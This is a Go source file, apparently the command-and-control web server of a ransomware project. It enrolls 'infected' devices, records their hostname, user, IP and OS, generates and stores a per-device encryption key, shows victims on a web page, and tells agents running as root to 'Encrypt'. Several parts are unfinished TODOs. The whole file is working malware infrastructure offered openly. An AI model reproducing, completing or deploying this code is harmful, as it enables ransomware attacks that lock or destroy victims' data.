package Webserver

import (
	"encoding/json"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"strings"
	"time"

	"github.com/fatih/color"
)

type Enumeration struct {
	ID        string `json:"ID"`
	Hostname  string `json:"Hostname"`
	User      string `json:"User"`
	IP        string `json:"IP"`
	Pwd       string `json:"Pwd"`
	OS        string `json:"OS"`
	Encrypted bool
	Key       string
}

var (
	device  Enumeration
	devices []Enumeration
)

//Query webserver is running
//Writes confirmation message to page
func HomeHandler(w http.ResponseWriter, r *http.Request) {
	defaultMessage := []byte("Listening for incoming connections ")
	_, err := w.Write(defaultMessage)
	if err != nil {
		log.Fatal(err)
	}
}

//listens for agents to enroll infected device (RegisterHost())
//enrols the agent into the DB
func InfectedHandler(w http.ResponseWriter, r *http.Request) {

	req, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Fatalf("Issue getting enumeration data from device: %s", err)
	}
	json.Unmarshal([]byte(req), &device)
	log.Printf("Enrolled a new device: %s", device.ID)
	device.Encrypted = false

	//TODO: call the key creation logic
	key := GenerateKey()
	device.Key = key

	dbConnection, err := Connect() //connect to the database
	if err != nil {
		log.Println("Cannot connect to db ", err)
	}
	err = Insert(dbConnection, device)
	if err != nil {
		log.Printf("Issue inserting data into the database for device: %s \nwith error: %s", device.ID, err.Error())
	}

}

//user page to view enrolled devices
//writes table with database entries
func ViewInfected(w http.ResponseWriter, r *http.Request) {
	t, err := template.ParseFiles("./pages/infected.gohtml")
	if err != nil {
		log.Fatalf("Issue with 'infected' html template: %s", err.Error())
	}
	dbConnection, err := Connect() //connect to the database
	if err != nil {
		log.Println("Cannot connect to db ", err)
	}
	devices, err := Query(dbConnection)
	if err != nil {
		log.Println("Cannot query the db ", err)
	}
	t.Execute(w, devices)
}

//Issue commands to listening hosts
//Tied to Agent.KeepAlive()
func CommandHandler(w http.ResponseWriter, r *http.Request) {

	color.Red("Device %s requesting commands \n", device.ID)
	if device.User == "Root" && !device.Encrypted {
		w.WriteHeader(http.StatusOK)
		command := []byte("Encrypt")
		w.Write(command)
		//TODO: update device.Encrypted = true -- Update function
		//err = update(device)
		//TODO: download the binary from the website

	} else {
		command := []byte("Wait")
		w.Write(command)
	}
}

//generates an encryption key
func GenerateKey() string {
	rand.Seed(time.Now().Unix())
	chars := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZ" +
		"abcdefghijklmnopqrstuvwxyz" +
		"0123456789" +
		"!@#$%^&*")

	var b strings.Builder

	for x := 0; x < 30; x++ {
		b.WriteRune(chars[rand.Intn(len(chars))])
	}
	str := b.String()
	fmt.Printf("this is the key: %s \n", str) //TODO: remove this debugging print
	return str
}
